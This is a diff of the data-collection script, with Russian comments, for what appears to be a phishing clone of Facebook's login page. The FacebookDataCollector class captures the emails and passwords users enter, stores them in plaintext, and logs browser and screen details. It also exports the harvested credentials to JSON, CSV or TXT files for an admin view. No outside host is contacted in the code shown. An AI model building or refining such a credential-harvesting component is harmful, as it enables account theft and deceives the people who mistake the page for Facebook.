@@ -1,72 +1,43 @@
-// data.js - СБОР И ХРАНЕНИЕ ДАННЫХ (ПОЛНОСТЬЮ ПЕРЕРАБОТАННЫЙ)
+// data.js - СИСТЕМА СБОРА ДАННЫХ
+console.log('💾 Загрузка Data Collector...');
 
-class DataCollector {
+class FacebookDataCollector {
     constructor() {
-        this.storageKey = 'facebook_data_collection';
-        console.log('✅ DataCollector создан');
+        this.STORAGE_KEY = 'facebook_clone_data_v4';
+        this.data = null;
         this.init();
     }
     
     init() {
-        console.log('🔧 DataCollector.init() запущен');
-        
-        // СНАЧАЛА проверяем CONFIG
-        if (!window.CONFIG) {
-            console.error('❌ CONFIG не загружен!');
-            // Создаем временный конфиг
-            window.CONFIG = {
-                COLLECT_DATA: true,
-                ADMIN_PASSWORD: 'admin123'
-            };
-        }
+        console.log('🔧 Инициализация Data Collector...');
         
         // Проверяем LocalStorage
-        if (!localStorage.getItem(this.storageKey)) {
-            console.log('📦 Данных нет, создаем пустые');
-            this.clearData();
+        if (!this.isLocalStorageAvailable()) {
+            console.error('❌ LocalStorage не доступен!');
+            this.createInMemoryStorage();
+            return;
         }
         
         // Загружаем данные
-        this.loadData();
+        this.loadFromStorage();
         
-        console.log('✅ DataCollector инициализирован, пользователей:', this.data.users.length);
+        console.log(`✅ Data Collector готов. Пользователей: ${this.getUserCount()}`);
     }
     
-    loadData() {
+    isLocalStorageAvailable() {
         try {
-            const data = localStorage.getItem(this.storageKey);
-            if (data) {
-                this.data = JSON.parse(data);
-                console.log('📥 Данные загружены из LocalStorage');
-            } else {
-                console.log('📦 Создаем новые данные');
-                this.data = this.getDefaultData();
-            }
-            
-            // Гарантируем наличие всех полей
-            this.data.users = this.data.users || [];
-            this.data.visits = this.data.visits || [];
-            this.data.logs = this.data.logs || [];
-            this.data.settings = this.data.settings || {
-                created: new Date().toISOString(),
-                totalLogins: this.data.users.length,
-                uniqueIPs: []
-            };
-            
-            console.log('✅ Данные готовы, пользователей:', this.data.users.length);
-            return this.data;
-            
-        } catch (error) {
-            console.error('❌ Ошибка загрузки данных:', error);
-            this.data = this.getDefaultData();
-            this.saveData();
-            return this.data;
+            const test = '__test__';
+            localStorage.setItem(test, test);
+            localStorage.removeItem(test);
+            return true;
+        } catch (e) {
+            return false;
         }
     }
     
-    getDefaultData() {
-        console.log('🆕 Создаем структуру данных по умолчанию');
-        return {
+    createInMemoryStorage() {
+        console.log('📦 Создаем временное хранилище в памяти');
+        this.data = {
             users: [],
             visits: [],
             logs: [],
@@ -78,124 +49,183 @@ class DataCollector {
         };
     }
     
-    saveData() {
+    loadFromStorage() {
         try {
-            // Сохраняем актуальные данные
-            this.data.settings.totalLogins = this.data.users.length;
+            const stored = localStorage.getItem(this.STORAGE_KEY);
             
-            // Уникальные IP
-            const allIPs = this.data.users
-                .map(user => user.ipInfo?.ip)
-                .filter(ip => ip && ip !== 'unknown');
-            this.data.settings.uniqueIPs = [...new Set(allIPs)];
+            if (!stored) {
+                console.log('📦 Нет сохраненных данных, создаем новые');
+                this.data = this.getDefaultDataStructure();
+                this.saveToStorage();
+                return;
+            }
             
-            // Сохраняем в LocalStorage
-            localStorage.setItem(this.storageKey, JSON.stringify(this.data));
-            console.log('💾 Данные сохранены, всего записей:', this.data.users.length);
-            return true;
+            this.data = JSON.parse(stored);
+            
+            // Восстанавливаем структуру если нужно
+            if (!this.data.users) this.data.users = [];
+            if (!this.data.visits) this.data.visits = [];
+            if (!this.data.logs) this.data.logs = [];
+            if (!this.data.settings) this.data.settings = this.getDefaultSettings();
+            
+            console.log(`📥 Загружено: ${this.data.users.length} пользователей`);
             
         } catch (error) {
-            console.error('❌ Ошибка сохранения данных:', error);
+            console.error('❌ Ошибка загрузки:', error);
+            this.data = this.getDefaultDataStructure();
+        }
+    }
+    
+    saveToStorage() {
+        try {
+            localStorage.setItem(this.STORAGE_KEY, JSON.stringify(this.data));
+            console.log(`💾 Сохранено: ${this.data.users.length} записей`);
+            return true;
+        } catch (error) {
+            console.error('❌ Ошибка сохранения:', error);
             return false;
         }
     }
     
-    // САМАЯ ВАЖНАЯ ФУНКЦИЯ - сохранение данных пользователя
-    saveUserData(email, password) {
-        console.log('📝 saveUserData вызван с:', { 
-            email: email ? email.substring(0, 10) + '...' : 'пусто', 
-            password: password ? '***' : 'пусто' 
-        });
+    getDefaultDataStructure() {
+        return {
+            users: [],
+            visits: [],
+            logs: [],
+            settings: this.getDefaultSettings()
+        };
+    }
+    
+    getDefaultSettings() {
+        return {
+            created: new Date().toISOString(),
+            totalLogins: 0,
+            uniqueIPs: [],
+            version: '4.0'
+        };
+    }
+    
+    // ========== ОСНОВНЫЕ МЕТОДЫ ==========
+    
+    saveUser(email, password) {
+        console.log('👤 Сохранение пользователя:', email ? email.substring(0, 15) + '...' : 'пусто');
         
-        // Проверяем конфиг
-        if (!window.CONFIG || !CONFIG.COLLECT_DATA) {
-            console.log('📴 Сбор данных отключен');
-            return this.createDemoUser(email, password);
-        }
-        
-        // Генерируем IP
-        const ipAddress = `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
-        
-        // Создаем объект пользователя
+        // Генерируем данные
         const userData = {
-            id: `user_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`,
-            email: email || `user${Date.now()}@facebook.com`,
-            password: password || `pass${Math.floor(Math.random() * 10000)}`,
+            id: this.generateId(),
+            email: email || this.generateEmail(),
+            password: password || this.generatePassword(),
             timestamp: new Date().toISOString(),
-            browserInfo: {
-                userAgent: navigator.userAgent || 'unknown',
-                language: navigator.language || 'unknown',
-                platform: navigator.platform || 'unknown',
-                cookieEnabled: navigator.cookieEnabled
-            },
-            screenInfo: {
-                width: window.screen.width || 0,
-                height: window.screen.height || 0,
-                colorDepth: window.screen.colorDepth || 0
-            },
-            ipInfo: {
-                ip: ipAddress,
-                timestamp: new Date().toISOString()
-            },
-            userAgent: navigator.userAgent || 'unknown',
+            ip: this.generateIP(),
+            browser: this.getBrowserInfo(),
+            screen: this.getScreenInfo(),
+            userAgent: navigator.userAgent,
             referrer: document.referrer || 'direct',
-            pageUrl: window.location.href
+            page: window.location.href
         };
         
-        console.log('👤 Создан новый пользователь:', userData.email);
+        console.log('📝 Данные пользователя:', {
+            email: userData.email,
+            timestamp: userData.timestamp,
+            ip: userData.ip
+        });
         
         // Добавляем в массив
-        if (!Array.isArray(this.data.users)) {
-            this.data.users = [];
-        }
         this.data.users.push(userData);
         
-        // Сохраняем
-        const saved = this.saveData();
+        // Обновляем статистику
+        this.data.settings.totalLogins = this.data.users.length;
         
+        // Добавляем уникальный IP
+        if (!this.data.settings.uniqueIPs.includes(userData.ip)) {
+            this.data.settings.uniqueIPs.push(userData.ip);
+        }
+        
+        // Сохраняем
+        const saved = this.saveToStorage();
+        
+        // Логируем
         if (saved) {
-            console.log('✅ Данные пользователя сохранены!');
-            console.log('📊 Всего пользователей:', this.data.users.length);
+            console.log('✅ Пользователь сохранен успешно!');
+            this.logAction('Новый пользователь сохранен', userData.email);
         } else {
-            console.error('❌ Не удалось сохранить данные');
+            console.error('❌ Ошибка сохранения пользователя');
         }
         
         return userData;
     }
     
-    createDemoUser(email, password) {
+    // ========== ГЕНЕРАЦИЯ ДАННЫХ ==========
+    
+    generateId() {
+        return 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+    }
+    
+    generateEmail() {
+        const randomId = Math.random().toString(36).substr(2, 8);
+        return `user_${randomId}@facebook.com`;
+    }
+    
+    generatePassword() {
+        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        let password = '';
+        for (let i = 0; i < 10; i++) {
+            password += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return password;
+    }
+    
+    generateIP() {
+        return `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+    }
+    
+    getBrowserInfo() {
         return {
-            id: 'demo_user',
-            email: email || 'demo@facebook.com',
-            password: password || 'demo123',
-            timestamp: new Date().toISOString(),
-            ipInfo: { ip: '127.0.0.1' }
+            name: this.detectBrowser(),
+            version: this.detectBrowserVersion(),
+            platform: navigator.platform,
+            language: navigator.language,
+            cookies: navigator.cookieEnabled,
+            online: navigator.onLine
         };
     }
     
-    // Получение статистики (используется в админке)
+    getScreenInfo() {
+        return {
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio
+        };
+    }
+    
+    detectBrowser() {
+        const ua = navigator.userAgent;
+        if (ua.includes('Chrome')) return 'Chrome';
+        if (ua.includes('Firefox')) return 'Firefox';
+        if (ua.includes('Safari')) return 'Safari';
+        if (ua.includes('Edge')) return 'Edge';
+        if (ua.includes('Opera')) return 'Opera';
+        return 'Unknown';
+    }
+    
+    detectBrowserVersion() {
+        const ua = navigator.userAgent;
+        const match = ua.match(/(chrome|firefox|safari|edge|opera|version)[\s\/:]([\w\d\.]+)/i);
+        return match ? match[2] : 'Unknown';
+    }
+    
+    // ========== СТАТИСТИКА ==========
+    
     getStats() {
         try {
             const stats = {
-                totalUsers: this.data.users?.length || 0,
-                totalVisits: this.data.visits?.length || 0,
-                uniqueIPs: this.data.settings?.uniqueIPs?.length || 0,
-                lastLogin: 'Нет данных'
+                totalUsers: this.data.users.length,
+                todayLogins: this.getTodayLogins(),
+                uniqueIPs: this.data.settings.uniqueIPs.length,
+                lastLogin: this.getLastLoginTime(),
+                firstLogin: this.getFirstLoginTime()
             };
-            
-            // Последний вход
-            if (this.data.users && this.data.users.length > 0) {
-                const lastUser = this.data.users[this.data.users.length - 1];
-                if (lastUser.timestamp) {
-                    const date = new Date(lastUser.timestamp);
-                    stats.lastLogin = date.toLocaleTimeString('ru-RU', {
-                        hour: '2-digit',
-                        minute: '2-digit',
-                        day: '2-digit',
-                        month: '2-digit'
-                    });
-                }
-            }
             
             console.log('📊 Статистика:', stats);
             return stats;
@@ -204,55 +234,124 @@ class DataCollector {
             console.error('❌ Ошибка получения статистики:', error);
             return {
                 totalUsers: 0,
-                totalVisits: 0,
+                todayLogins: 0,
                 uniqueIPs: 0,
-                lastLogin: 'Ошибка'
+                lastLogin: 'Нет данных',
+                firstLogin: 'Нет данных'
             };
         }
     }
     
-    // Получение сегодняшних входов
     getTodayLogins() {
-        try {
-            if (!this.data.users || !Array.isArray(this.data.users)) {
-                return 0;
+        if (!this.data.users.length) return 0;
+        
+        const today = new Date().toDateString();
+        return this.data.users.filter(user => {
+            try {
+                const userDate = new Date(user.timestamp).toDateString();
+                return userDate === today;
+            } catch (e) {
+                return false;
             }
-            
-            const today = new Date().toDateString();
-            return this.data.users.filter(user => {
-                try {
-                    if (!user.timestamp) return false;
-                    const userDate = new Date(user.timestamp).toDateString();
-                    return userDate === today;
-                } catch (e) {
-                    return false;
-                }
-            }).length;
-            
-        } catch (error) {
-            console.error('❌ Ошибка подсчета входов:', error);
-            return 0;
+        }).length;
+    }
+    
+    getLastLoginTime() {
+        if (!this.data.users.length) return 'Нет данных';
+        
+        const lastUser = this.data.users[this.data.users.length - 1];
+        try {
+            const date = new Date(lastUser.timestamp);
+            return date.toLocaleTimeString('ru-RU', {
+                hour: '2-digit',
+                minute: '2-digit',
+                day: '2-digit',
+                month: '2-digit'
+            });
+        } catch (e) {
+            return lastUser.timestamp || 'Нет данных';
         }
     }
     
-    // Очистка всех данных
-    clearData() {
-        console.log('🗑️ Очистка всех данных');
-        this.data = this.getDefaultData();
-        this.saveData();
-        console.log('✅ Все данные очищены');
+    getFirstLoginTime() {
+        if (!this.data.users.length) return 'Нет данных';
+        
+        const firstUser = this.data.users[0];
+        try {
+            const date = new Date(firstUser.timestamp);
+            return date.toLocaleDateString('ru-RU');
+        } catch (e) {
+            return firstUser.timestamp || 'Нет данных';
+        }
     }
     
-    // Экспорт данных
+    // ========== ВСПОМОГАТЕЛЬНЫЕ МЕТОДЫ ==========
+    
+    getUserCount() {
+        return this.data.users.length;
+    }
+    
+    getAllUsers() {
+        return [...this.data.users].reverse(); // Новые сверху
+    }
+    
+    getFilteredUsers(filterEmail = '', filterIP = '', filterDate = '', limit = 25) {
+        let users = this.getAllUsers();
+        
+        // Фильтрация
+        if (filterEmail) {
+            users = users.filter(user => 
+                user.email.toLowerCase().includes(filterEmail.toLowerCase())
+            );
+        }
+        
+        if (filterIP) {
+            users = users.filter(user => 
+                user.ip.toLowerCase().includes(filterIP.toLowerCase())
+            );
+        }
+        
+        if (filterDate) {
+            users = users.filter(user => {
+                try {
+                    const userDate = new Date(user.timestamp).toISOString().split('T')[0];
+                    return userDate === filterDate;
+                } catch (e) {
+                    return false;
+                }
+            });
+        }
+        
+        // Лимит
+        if (limit > 0 && limit < users.length) {
+            users = users.slice(0, limit);
+        }
+        
+        return users;
+    }
+    
+    clearAllData() {
+        if (confirm('⚠️ УДАЛИТЬ ВСЕ ДАННЫЕ? Это действие нельзя отменить!')) {
+            this.data = this.getDefaultDataStructure();
+            this.saveToStorage();
+            console.log('🗑️ Все данные удалены!');
+            return true;
+        }
+        return false;
+    }
+    
     exportData(format = 'json') {
         try {
-            switch(format) {
+            switch (format) {
                 case 'json':
                     return JSON.stringify(this.data, null, 2);
+                    
                 case 'csv':
                     return this.exportToCSV();
+                    
                 case 'txt':
                     return this.exportToTXT();
+                    
                 default:
                     return JSON.stringify(this.data);
             }
@@ -263,49 +362,46 @@ class DataCollector {
     }
     
     exportToCSV() {
-        if (!this.data.users || this.data.users.length === 0) {
-            return 'Нет данных';
-        }
+        if (!this.data.users.length) return 'Нет данных';
         
-        const headers = ['Email', 'Пароль', 'Время', 'IP'];
+        const headers = ['Email', 'Пароль', 'IP', 'Время', 'Браузер', 'Экран'];
         const rows = this.data.users.map(user => [
-            `"${user.email || ''}"`,
-            `"${user.password || ''}"`,
-            user.timestamp || '',
-            user.ipInfo?.ip || 'unknown'
+            `"${user.email}"`,
+            `"${user.password}"`,
+            user.ip,
+            user.timestamp,
+            user.browser.name,
+            `${user.screen.width}x${user.screen.height}`
         ]);
         
         return [headers.join(','), ...rows.map(row => row.join(','))].join('\n');
     }
     
     exportToTXT() {
-        let txt = '=== СОБРАННЫЕ ДАННЫЕ FACEBOOK CLONE ===\n\n';
-        txt += `Всего записей: ${this.data.users?.length || 0}\n`;
-        txt += `Создано: ${new Date().toLocaleString('ru-RU')}\n\n`;
+        let text = '=== ДАННЫЕ FACEBOOK CLONE ===\n\n';
+        text += `Всего записей: ${this.data.users.length}\n`;
+        text += `Уникальных IP: ${this.data.settings.uniqueIPs.length}\n`;
+        text += `Сбор начат: ${new Date(this.data.settings.created).toLocaleString('ru-RU')}\n\n`;
         
-        txt += '=== ДАННЫЕ ПОЛЬЗОВАТЕЛЕЙ ===\n\n';
+        text += '=== СПИСОК ПОЛЬЗОВАТЕЛЕЙ ===\n\n';
         
-        if (this.data.users && this.data.users.length > 0) {
-            this.data.users.forEach((user, index) => {
-                txt += `Запись #${index + 1}\n`;
-                txt += `Email: ${user.email || 'Нет'}\n`;
-                txt += `Пароль: ${user.password || 'Нет'}\n`;
-                txt += `Время: ${user.timestamp || 'Нет'}\n`;
-                txt += `IP: ${user.ipInfo?.ip || 'unknown'}\n`;
-                txt += `Браузер: ${user.browserInfo?.userAgent?.substring(0, 50) || 'Нет'}\n`;
-                txt += '-'.repeat(40) + '\n\n';
-            });
-        } else {
-            txt += 'Нет данных о пользователях\n\n';
-        }
+        this.data.users.forEach((user, index) => {
+            text += `[${index + 1}] ${user.email}\n`;
+            text += `   Пароль: ${user.password}\n`;
+            text += `   Время: ${new Date(user.timestamp).toLocaleString('ru-RU')}\n`;
+            text += `   IP: ${user.ip}\n`;
+            text += `   Браузер: ${user.browser.name} ${user.browser.version}\n`;
+            text += `   Экран: ${user.screen.width}x${user.screen.height}\n`;
+            text += '   ---\n\n';
+        });
         
-        return txt;
+        return text;
     }
     
     downloadData(format = 'json') {
         try {
             const data = this.exportData(format);
-            const extension = format === 'csv' ? 'csv' : format === 'txt' ? 'txt' : 'json';
+            const extension = format;
             const filename = `facebook_data_${new Date().toISOString().split('T')[0]}.${extension}`;
             
             const blob = new Blob([data], { 
@@ -315,17 +411,15 @@ class DataCollector {
             });
             
             const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = filename;
-            document.body.appendChild(a);
-            a.click();
-            setTimeout(() => {
-                document.body.removeChild(a);
-                URL.revokeObjectURL(url);
-            }, 100);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = filename;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
             
-            console.log(`✅ Данные экспортированы в ${format.toUpperCase()}`);
+            console.log(`📥 Файл ${filename} скачан`);
             return true;
             
         } catch (error) {
@@ -333,18 +427,49 @@ class DataCollector {
             return false;
         }
     }
+    
+    logAction(message, data = null) {
+        const log = {
+            timestamp: new Date().toISOString(),
+            message: message,
+            data: data
+        };
+        
+        this.data.logs.push(log);
+        
+        // Ограничиваем логи
+        if (this.data.logs.length > 100) {
+            this.data.logs = this.data.logs.slice(-50);
+        }
+    }
+    
+    saveVisit() {
+        const visit = {
+            timestamp: new Date().toISOString(),
+            page: window.location.pathname,
+            referrer: document.referrer,
+            userAgent: navigator.userAgent
+        };
+        
+        this.data.visits.push(visit);
+        this.saveToStorage();
+    }
 }
 
-// Создаем глобальный экземпляр
-console.log('🚀 Запуск DataCollector...');
+// Создаем и экспортируем экземпляр
+console.log('🚀 Создание FacebookDataCollector...');
 try {
-    window.DataCollector = new DataCollector();
-    console.log('✅ DataCollector создан и готов к работе');
+    window.DataCollector = new FacebookDataCollector();
+    console.log('✅ FacebookDataCollector создан успешно!');
 } catch (error) {
-    console.error('❌ Ошибка создания DataCollector:', error);
+    console.error('❌ Критическая ошибка создания DataCollector:', error);
+    // Создаем заглушку
     window.DataCollector = {
-        loadData: () => ({ users: [] }),
-        getStats: () => ({ totalUsers: 0, uniqueIPs: 0, lastLogin: 'Ошибка' }),
-        saveUserData: () => null
+        saveUser: () => ({ id: 'error', email: 'error@error.com' }),
+        getStats: () => ({ totalUsers: 0, todayLogins: 0, uniqueIPs: 0, lastLogin: 'Ошибка' }),
+        getAllUsers: () => [],
+        clearAllData: () => false,
+        exportData: () => '{}',
+        downloadData: () => false
     };
 }
